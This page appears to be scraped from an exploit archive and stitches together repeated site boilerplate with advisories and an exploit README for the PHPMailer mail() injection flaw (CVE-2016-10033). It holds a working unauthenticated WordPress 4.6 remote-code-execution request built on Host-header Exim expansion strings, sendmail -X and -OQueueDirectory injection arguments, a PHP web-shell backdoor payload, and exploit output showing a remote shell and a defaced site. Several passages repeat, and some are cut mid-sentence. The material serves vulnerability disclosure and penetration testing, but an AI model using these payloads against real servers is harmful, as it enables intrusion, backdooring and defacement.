this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as

- CVE-2016-10033
- Release date: 03.05.2017
- Revision 2.0
- Last  update: 04.05.2017
- Severity: Critical
====================================================

I. VULNERABILITY
-------------------------

WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) PoC Exploit
		     (default configuration, no plugins, no auth)

II. BACKGROUND
-------------------------

"WordPress is a free and open-source content management system
(CMS) based on PHP and MySQL.

WordPress was used by more than 27.5% of the top 10 million
websites as of February 2017. WordPress is reportedly the
most popular website management or blogging system in
use on the Web, supporting more than 60 million websites."

<https://en.wikipedia.org/wiki/WordPress>

III. INTRODUCTION
-------------------------

This advisory reveals details of exploitation of the PHPMailer
vulnerability (CVE-2016-10033) in WordPress Core which (contrary to what
was believed and announced by WordPress security team) was affected by the
vulnerability.

The Remote Code Execution attack could be used by unauthenticated remote attackers
to gain instant access to the target server on which a vulnerable WordPress
core version was installed in its default configuration which could lead
to a full compromise of the target application server.
No plugins or non-standard settings are required to exploit the vulnerability.

This advisory reveals new exploitation vectors for PHP mail()
function discovered by the author that allow to exploit the vulnerability on a
most popular MTA (Mail Transfer Agent) - Exim which can be found installed by
default on many system such as Debian or Ubuntu, as opposed to rarely used
Sendmail MTA that has been thought to be a requirement for mail() injection
attacks to date.

Due to critical severity of this vulnerability, disclosure of new
exploitation vectors that increase the range of this type of attacks, and the ease
of mass exploitation, the release of this advisory was delayed by an
extended period of time to allow WordPress and other potentially affected
software vendors enough time to update affected mail libraries.

IV. DESCRIPTION
-------------------------

The following snippet of code from WordPress 4.6 - file wp-includes/pluggable.php:

      if ( !isset( $from_email ) ) {
              // Get the site domain and get rid of www.
              $sitename = strtolower( $_SERVER['SERVER_NAME'] );
              if ( substr( $sitename, 0, 4 ) == 'www.' ) {
                      $sitename = substr( $sitename, 4 );
              }

              $from_email = 'wordpress@' . $sitename;
      }

      /**
       * Filters the name to associate with the "from" email address.
       *
       * @since 2.3.0
       *
       * @param string $from_name Name associated with the "from" email address.
       */
      $from_name = apply_filters( 'wp_mail_from_name', $from_name );

      $phpmailer->setFrom( $from_email, $from_name );

shows that WordPress sets the email domain based on SERVER_NAME server
header when WordPress wp_mail() function is called to send an email (e.g. upon
user registration, forgotten password etc.).

As we can see the from address is formed as follows:

$from_email = 'wordpress@' . $sitename;

It is then filtered and passed to a vulnerable setFrom() function of PHPMailer which
was explained in detail in the previous advisories:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

Injection
==============

SERVER_NAME server header can be manipulated on default configurations of Apache
Web server (most common WordPress deployment) via HOST header of a HTTP request.

To illustrate, here is a request and response of a simple php script vars.php that
simply prints out relevant parts of server headers ($_SERVER PHP array):

GET /vars.php HTTP/1.1
Host: xenialINJECTION

HTTP/1.1 200 OK
Server: Apache

Array
(
  [HTTP_HOST] => xenialINJECTION
  [SERVER_SOFTWARE] => Apache/2.4.18 (Ubuntu)
  [SERVER_NAME] => xenialinjection
...

As we can see, INJECTION string appended to the hostname in HOST header gets
copied to both HTTP_HOST and SERVER_NAME  PHP variables.

Using this HOST header example, if an attacker triggered wp_mail() function
by using the forgotten password WordPress feature, the HTTP request would be similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenialINJECT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close

user_login=admin&redirect_to=&wp-submit=Get+New+Password

and would result in the following parameters passed to /usr/sbin/sendmail :

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenialinject]

What is interesting here is the 3rd parameter. The domain part of the email
matches the HOST header of the request, except for lower-case "inject".

Bypassing the filters
=======================

To exploit the PHPMailer's mail() injection vulnerability, an attacker would
have to be able to append parameters to the domain part.
However, the filtration/validation in
place (both on the wordpress side as well as PHPMailer library side) would
prevent the attacker from injecting white-characters (such as space
or TAB) and therefore from injecting parameters to sendmail binary.

For example, if attacker modified the HOST header to the following:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenialINJECT SPACE

the validation would result in invalid domain part error and WordPress
application would exit with http response of:

HTTP/1.0 500 Internal Server Error

In which case wp_mail() and therefore the vulnerable PHPMailer
functions would never be reached (sendmail binary would not be executed).

The validateAddress() function of PHPMailer library as well as PHP's
filter_var/FILTER_VALIDATE_EMAIL are both complient with RFC 822 standard
as we can read at:

<http://php.net/manual/en/filter.filters.validate.php>

which prohibits spaces in the domain part and thus prevents injection
of additional parameters to /usr/sbin/sendmail.

It should be noted that the technique of injecting additional \ backslash
characters to the username part of the email presented in PHPMailer advisory:
<http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

would not be an option for the attacker as username part of the from
address cannot be controlled in this case.

RFC 822 and comment syntax
--------------

Looking at the RFC 822 specs however, a potential way to bypass the validation
was found. According to:
<https://www.ietf.org/rfc/rfc822.txt>

email addresses can contain comments:

"
3.4.3.  COMMENTS

      A comment is a set of ASCII characters, which is  enclosed  in
      matching  parentheses  and which is not within a quoted-string
      The comment construct permits message originators to add  text
      which  will  be  useful  for  human readers, but which will be
      ignored by the formal semantics.  Comments should be  retained
      while  the  message  is subject to interpretation according to
      this standard.  However, comments  must  NOT  be  included  in
      other  cases,  such  as  during  protocol  exchanges with mail
      servers.
"

The document gives an email example of with comments in brackets:

":sysmail"@  Some-Group. Some-Org,
          Muhammed.(I am  the greatest) Ali @(the)Vegas.WBA

as a valid email.

A simplified comment example within the domain part would be:

john@example.com(comment)

After further testing, it turned out that comment part can contain spaces
in the domain part, and could be used as a way to bypass the
validation of the domain part and inject additional parameters to
sendmail binary.

Injecting parameters via comment syntax
----------------

The following request with the HOST header set to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 injected tmp2)

will not cause errors and will result in the following parameters supplied to
sendmail :

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [injected]
Arg no. 5 == [tmp2)]

As we can see, We have managed to bypass filters/validation provided by

Wordpress filter:

apply_filters( 'wp_mail_from_name', $from_name );

As well as PHPMailer's internal setFrom() validation.

We now have control over the 4th parameter ('injected') and can inject
more parameters inbeetwen arg no.3 and no.5 if necessary.

In theory we should now be able to inject additional parameters to
/usr/sbin/sendmail wrapper to achieve arbitrary code execution.

Code Execution via Sendmail MTA
=================================

To date, the only known way of achieving remote code execution via
PHP mail() exploitation relied on Sendmail MTA being present on the
target system.

The most common Sendmail MTA vector is similar to:

-OQueueDirectory=/tmp/ -X/var/www/html/backdoor.php

It typically writes out a log file with a php backdoor contained within the
input message.

There are 2 problems with this technique however:

1)
Sendmail MTA is not commonly used anymore as we can verify by looking
at the statistics at:

<http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html>

which show that Sendmail is the least popular among Linux MTAs.

It does not ship with any modern Linux distribution and it is not
very likely for it to be found installed on a target.

2)
The Sendmail technique presented above would not work in the case
of the WordPress vulnerability discussed in this advisory.
As previously mentioned, hostname copied to SERVER_NAME server
variable gets converted into lower-case and therefore injecting
Sendmail parameters in a request similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -O -X tmp2)

would result in the follwing set of sendmail arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-o]
Arg no. 5 == [-x]
Arg no. 6 == [tmp2)]

Sendmail would fail with an error as arguments are case-sensitive
and neither -q nor -x would work.

Code execution via Exim4 MTA
=================================

While researching the other vulnerabilities in email sending
libraries (see previously published advisories for PHPMailer, ZendMail,
Swiftmailer), the author of this advisory discovered a new way to
achieve command execution with the help of Exim MTA that was
previously thought to be immune to mail() injection attacks.

This technique has been documented in the white-paper :
["Pwning PHP mail() function For Fun And Remote Code Execution"](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

The ability to execute commands through Exim4 MTA opens up many
possibilities in regards to exploitation not only of already disclosed
vulnerabilities in PHPMailer and other email libraries, but also in
regards to mail() function exploitation in general as Exim4 is the
most popular MTA available by default on popular Linux distributions
such as Debian.

The survey confirms the popularity of exim:
<http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html>

This increases the chances of it being present on the remote target
and is ideal for a reliable proof of concept exploit of the vulnerability
presented in this advisory.

Direct code execution with Exim4 MTA
--------------------------------

The discovered Exim MTA vector, in its most basic form works
in the following way:

sendmail -be '${run{/bin/true}{true}{false}}'
true

The -be switch enables string expansion testing mode.
The above expansion executes /bin/true and returns the value from
the brackets based on the exit code.

Similarly, the expansion:
sendmail -be '${run{/bin/bash -c "id"}{yes}{no}}'

would execute id command.

Note: on systems with Exim4, /usr/sbin/sendmail is just a symlink:
/usr/sbin/sendmail -> exim4
and has nothing to do with Sendmail MTA.
Sendmail MTA is not required to be present on the system for the
technique to work.

What is very powerful about this vector is that command
execution can be achieved in a reliable way directly through the
$run expansion specified as an argument and does not require
writing files to /var/www/html or guessing directory paths
which is the case in already known Sendmail MTA vector.

HOST header restrictions
----------------------------------

The seemingly simple Exim4 vector turned out to be tricky in practice
since the presented above expansion string would not work within HOST header.

A HTTP request similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 slash/ -X tmp2)

would be rejected by Apache webserver due to / (slash) character
present within the HOST header.
The $run function would not
work without it as it requires  a full path to the binary that is being
executed (suggesting that exim4 uses exec() to run it and does
not execute commands through system() ).

Bypassing restrictions
==============================

To bypass restriction of the HOST header several methods
were attempted by studying available Exim expansion strings at:

<http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html>

Embeded perl
----------------------

One of the expansions that was considered was:
${perl{foo}{argument1}{argument2} ... }

however perl is not enabled by default on Exim and therefore
would not make the exploit reliable.

Encoding
---------------------

The family of base64 and HEX encoding/decoding functions were tested
but they did not seem to be supported by exim4 used for testing and
would result in errors such as:

sendmail -be '${base64d:QUI=}'
Failed: unknown expansion operator "base64d"

Substrings & Environment variables
---------------------

Another idea was to use known environment variables in combination
with substrings to extract forbidden slash character.

For example, the PATH environment variable contains slash:

PATH=/bin:/usr/bin

and therefore was a good candidate.

${env{PATH}} could be used to retrieve the variable and when
connected with $substring expansion, slash could be obtained
as can be seen in the following command:

sendmail -be '${substr{0}{1}{${env{PATH}}}}'
/

Unfortunately, this technique led to a dead-end as environment
variables such as PATH when inserted within HOST header would
be converted to lower-case and thus not work under Linux.

Substrings & internal exim4 variables
--------------------------------------

With trial and error, the following variable was found to work
as expected:

sendmail -be '${spool_directory}'
/var/spool/exim4

The spool_directory variable is present by default, and does
not have capital letters  and therefore would work reliably.

The slash character could now be replaced with:

${substr{0}{1}{$spool_directory}}

to bypass the slash restriction of the HOST header.

The following expansion:

sendmail -be '${run{/usr/bin/touch /tmp/test}}'

Could now be converted to:

sendmail -be '${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch ${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}'

This worked fine under terminal however when tested within a HTTP request:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch ${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}  tmp2)

it would result in the following sendmail parameters:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-be]
Arg no. 5 == [${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch]
Arg no. 6 == [${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}]
Arg no. 7 == [tmp2)]

As we can see, the expansion payload got broken into 2 arguments 5 & 6
instead of one.
This prevented Exim from executing the payload properly.

The problem was caused by spaces between command parameters (e.g. space after
'touch')

Replacing spaces
------------------

First the environment variable IFS was considered, however
environment variables would not work properly as previously tested.

After further research a convenient internal exim variable was found:

sendmail -be '${tod_log}'
2016-01-02 23:49:42

the tod_log variable returns current date in format that contains a space.

Similar to the slash replacement, $substring + $tod_log variable could
be used to replace the space as was tested with:

sendmail -be '${substr{10}{1}{$tod_log}}'

PoC HTTP request / minimal PoC exploit
====================================

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}  tmp2)
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

user_login=admin&redirect_to=&wp-submit=Get+New+Password

The above request when sent to WordPress core application would cause exim
to be called with the following arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-be]
Arg no. 5 == [${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}]
Arg no. 6 == [tmp2)]

which would execute:
/usr/bin/touch /tmp/test

on the target and create a file /tmp/test as tested on WordPress 4.6.

Using this payload logic a working exploit was built which executes
a reverse shell on the target.

VI. BUSINESS IMPACT
-------------------------

Upon a successfull exploitation, a remote unauthenticated attacker
would be able to execute arbitrary code on the target server and compromise
the target application.

VII. SYSTEMS AFFECTED
-------------------------

The Remote Code Execution PoC exploit described in this advisory is based
on version 4.6 although other versions of WordPress (prior to 4.7.1 which
fixed the PHPMailer vulnerability) might also be affected.

The advisory presents the exploitation on the example of Exim MTA,
the author has also developed another exploit that can also be used on
other MTA software. The exploit will be shared shortly after this advisory.

VIII. SOLUTION
-------------------------

Update to the latest version of WordPress.

Full Advisory URL:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fattacker\]
Arg no. 4 == [-oQ/tmp/]
Arg no. 5 == [-X/var/www/cache/phpcode.php]
Arg no. 6 == [some"@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
The resulting file will contain the payload passed in the body of the msg:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

PHPMailer is the world's most popular transport class, with an estimated 9 million users worldwide. Downloads continue at a significant pace daily. Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! and many more

PHPMailer before its version 5.2.18 suffer from a vulnerability that could lead to remote code execution (RCE). The mailSend function in the isMail transport in PHPMailer, when the Sender property is not set, might allow remote attackers to pass extra parameters to the mail command and consequently execute arbitrary code via a " (backslash double quote) in a crafted From address.

### Vulnerable environment

To setup a vulnerable environment for your test you will need [Docker](https://docker.com) installed, and just run the following command:

```
docker run --rm -it -p 8080:80 vulnerables/cve-2016-10033

```

And it will spawn a vulnerable web application on your host on `8080` port

[![vulnerable](/opsxcq/exploit-CVE-2016-10033/raw/master/vulnerable.png)](/opsxcq/exploit-CVE-2016-10033/blob/master/vulnerable.png)

### Exploit

To exploit this target just run:

```
./exploit host:port

```

If you are using this vulnerable image, you can just run:

```
./exploit localhost:8080

```

After the exploitation, a file called backdoor.php will be stored on the root folder of the web directory. And the exploit will drop you a shell where you can send commands to the backdoor:

```
./exploit.sh localhost:8080
[+] CVE-2016-10033 exploit by opsxcq
[+] Exploiting localhost:8080
[+] Target exploited, acessing shell at http://localhost:8080/backdoor.php
[+] Checking if the backdoor was created on target system
[+] Backdoor.php found on remote system
[+] Running whoami
www-data
RemoteShell>

```

And that's it, you have your shell. There is another exploit, which ilustrates another use case.

```
./deface.sh localhost:8080
[+] CVE-2016-10033 exploit by opsxcq
[+] Exploiting localhost:8080
[+] Target exploited, acessing shell at http://localhost:8080/backdoor.php
[+] Checking if the backdoor was created on target system
[+] Backdoor.php found on remote system
[+] Placing your message in the server
[+] Job done, exiting

```

And if you visit the page again, you will see this:

[![defaced](/opsxcq/exploit-CVE-2016-10033/raw/master/defaced.png)](/opsxcq/exploit-CVE-2016-10033/blob/master/defaced.png)

### Vulnerable code

Before this [commit](https://github.com/PHPMailer/PHPMailer/commit/4835657cd639fbd09afd33307cef164edf807cdc) in [class.phpmailer.php](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L1445) in a certain scenario there is no filter in the sender's email address special chars. This flaw can lead to a remote code execution, via `mail` function [here](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L700).

Analysing the code, there is no filter in `mailSend()` function

```
        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }
```

`$this->Sender` is directly appended to `$params` variable, which was filtered in `validateAddress()` function, but as it uses RFC 3696 specification, it allow certain characters which will break things.
In this case, quotes:

> In addition to quoting using the backslash character, conventional
> double-quote characters may be used to surround strings. For example
>
> "Abc@def"@example.com
>
> "Fred Bloggs"@example.com
>
> are alternate forms of the first two examples above. These quoted
> forms are rarely recommended, and are uncommon in practice, but, as
> discussed above, must be supported by applications that are
> processing email addresses. In particular, the quoted forms often
> appear in the context of addresses associated with transitions from
> other systems and contexts; those transitional requirements do still
> arise and, since a system that accepts a user-provided email address
> cannot "know" whether that address is associated with a legacy
> system, the address forms must be accepted and passed into the email
> environment.

You can read the whole RFC [here](https://tools.ietf.org/rfc/rfc3696.txt) if you want. But also, if PHP version is inferior to 5.2.0, and there is no PCRE installed, `$patternselect` variable in `validateAddress()` will be set to `noregex`. It will cause the input will be able to avoid any regex check. It will only pass through a small verification:

```
            case 'noregex':
                //No PCRE! Do something _very_ approximate!
                //Check the address is 3 chars or longer and contains an @ that's not the first or last char
                return (strlen($address) >= 3
                    and strpos($address, '@') >= 1
                    and strpos($address, '@') != strlen($address) - 1);
```

Then, the code flow goes to `mailPassthru()` function, which, if running in `safe_mode` won't be vulnerable to this flaw, as the following code states it

```
        //Can't use additional_parameters in safe_mode
        //@link http://php.net/manual/en/function.mail.php
        if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
        }
```

But, if it isn't running in `safe_mode`, then our **special parameter** will be passed to `mail()` and, if we were lucky, it will get our file containing whatever we want to be written where we choose it to be wrote to.

### Notes about PHP mail() function exploitation

The exploitation of PHP mail() function isn't a new thing, but it still alive and people still using it. To explain how it works, lets look at how mail() function is defined:

```
bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )
```

There are several exploitation methods for different results, we will focus on the exploitation of the **5th parameter** to get Remote Code Execution (RCE). The parameter `$additional_parameters` is used to pass additional flags as command line options to the program configured to send the email. This configuration is defined by the `sendmail_path` variable.

A security note from [php official documentation](http://php.net/manual/en/function.mail.php):

> The additional\_parameters parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail\_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmiail option.

> This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters. For security reasons, it is recommended for the user to sanitize this parameter to avoid adding unwanted parameters to the shell command.

Considering the additional parameters that can be injectected we will use `-X` to exploit this flaw. More about the `-X` parameter

```
-X logfile
Log all traffic in and out of mailers in the indicated log file. This should only be used as a last resort for debugging mailer bugs. It will log a lot of data very quickly.

```

There are also some other interesting parameters that you should know that exist:

```
-Cfile
Use alternate configuration file. Sendmail gives up any enhanced (set-user-ID or set-group-ID) privileges if an alternate configuration file is specified.

```

And

```
-O option=value
Set option option to the specified value. This form uses long names.

```

And for `-O` option, the `QueueDirectory` is the most interesting option there, this option select the directory in which to queue messages.

If you want to read the whole list of parameters and options, just `man sendmail` or read it online [here](https://linux.die.net/man/8/sendmail.sendmail)

Based on this information, and the hability to control at least one of the other parameters, we can exploit the host. Bellow the steps for a successful exploitation:

* Control `$additional_parameters` and another `mail()` parameter
* Know a **writeable** diretory on target host which is accessible via the target system and user (www-data for example). Usually this directory can be anything bellow `webroot` (aka /var/www/html for another systems, /www for this example)
* Any PHP payload that you want, we are using a simple `system()` payload in this example, with a spice of base64 and some special characters `|` to make it easier to parse.
* Just assembly everything together !

Remember that the `-X` option will write the log file, that will contain among the log information your PHP payload, in the directory that you will inform. An example of a vulnerable PHP code:

```
$to = 'hacker@server.com';
$subject = '<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>';
$message = 'Pwned';
$headers = '';
$options = '-OQueueDirectory=/tmp -X/www/backdoor.php';
mail($to, $subject, $message, $headers, $options);
```

If you execute the code above, it will create a log file in the `/www/backdoor.php`, this is the essence of this exploit.

### Payload

Bellow the payload used in this example

```
<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>

```

### I wanna chase bugs, now what ?

Want a easy, one command, way to try to spot this flaw ? Remind this magic grep command !

```
grep -r -n --include "*.php" "mail(.*,.*,.*,.*,.*)" *

```

Running it against this repository will result in

```
src/class.phpmailer.php:700:            $result = @mail($to, $subject, $body, $header, $params);

```

- Last revision: 28.12.2016
- Revision 4.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

PHPMailer < 5.2.18 Remote Code Execution

II. BACKGROUND
-------------------------

"PHPMailer continues to be the world's most popular transport class, with an
estimated 9 million users worldwide. Downloads continue at a significant
pace daily."

<http://phpmailer.worxware.com/>

"Probably the world's most popular code for sending email from PHP!
Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, [..],
Joomla! and many more"

<https://github.com/PHPMailer/PHPMailer>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in PHPMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.

Note: This revision (4.0) of the advisory, contains more information but
is still incomplete.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

PHPMailer class uses PHP mail() function as its default transport.

The transport is implemented using the function:

    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);

which essentially passes the arguments shown in the line:

$result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);

to the mail() function with the same set of parameters.

The parameters include the 5th parameter of $params which allows to pass extra
parameters to sendmail binary installed on the system as per PHP documentation
of mail() function:

<http://php.net/manual/en/function.mail.php>

As can we see from:

$params = sprintf('-f%s', $this->Sender);

PHPMailer uses the Sender variable to build the params string.

The Sender string is normally set with the use of setFrom() method.
which validates the Sender's address:

public function setFrom($address, $name = '', $auto = true)
{
$address = trim($address);
$name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
// Don't validate now addresses with IDN. Will be done in send().
if (($pos = strrpos($address, '@')) === false or
    (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and
    !$this->validateAddress($address)) {
...

The validation would for example reject an address as:

attacker -InjectedParam2 @attacker.com

which would prevent injection of additional parameters to Sendmail via the
mail() function.

